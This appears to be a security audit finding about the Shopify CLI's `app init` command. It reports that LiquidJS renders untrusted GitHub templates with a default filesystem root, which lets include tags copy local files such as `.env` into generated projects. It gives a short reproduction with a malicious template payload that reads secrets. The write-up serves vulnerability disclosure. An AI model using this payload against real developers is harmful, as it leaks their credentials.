---
Phase: 10
Sequence: 8
Slug: liquid-template-root-file-disclosure
Verdict: VALID
Severity-Original: MEDIUM
PoC-Status: executed
Protocol: local
Auth-Required: no
Auth-Roles-Required: anonymous
Pre-FP-Flag: untrusted-template-precondition
Debate: piolium/chamber-workspace/c07-liquid-template/debate.md
Origin-Drafts: p7-001-liquidjs-default-root-file-read.md; p8-002-liquid-template-root-file-disclosure.md
id: p10
slug: liquid-template-root-file-disclosure
severity: info
---

# Custom app templates render Liquid includes against the caller working directory

## Summary
`shopify app init` accepts custom GitHub template repositories and renders `.liquid` files with `new Liquid()` using default filesystem options. LiquidJS defaults template roots to the process working directory, so include/render/layout tags in an untrusted template can read files such as `.env` from where the developer ran the CLI and write them into the generated scaffold.

## Location
- `packages/app/src/cli/commands/app/init.ts:41-45` — custom GitHub templates are accepted.
- `packages/app/src/cli/services/init/validate.ts:11-16` — validation only restricts the origin to GitHub.
- `packages/app/src/cli/services/init/init.ts:72-101` — downloads and renders the template.
- `packages/cli-kit/src/public/node/liquid.ts:24-26` and `:65-72` — renders with default `new Liquid()` and writes rendered contents.
- `packages/app/src/cli/services/init/init.ts:174-179` — installs dependencies from the rendered scaffold.

## Attacker Control
A malicious or compromised GitHub template controls `.liquid` file contents, including Liquid include/render/layout tags.

## Trust Boundary Crossed
Downloaded template data crosses into local filesystem reads outside the downloaded template tree because the Liquid root is not pinned to the template directory.

## Impact
Local file disclosure from the developer's current working directory into generated project files, with potential exfiltration through template-controlled dependency installation or later commit/share.

## Evidence
`renderLiquidTemplate()` constructs `const engine = new Liquid()` with no `root`, `partials`, `layouts`, `relativeReference`, or in-memory template map. `recursiveLiquidTemplateCopy()` reads attacker-controlled `.liquid` files and writes the rendered result to the scaffold.

## Reproduction Steps
1. Publish a GitHub template containing `leaked-env.txt.liquid` with `{% include ".env" %}`.
2. Have the developer run `shopify app init --template https://github.com/attacker/template` from a directory containing `.env`.
3. The default Liquid root resolves the include relative to the process CWD and writes the secret into the generated scaffold.
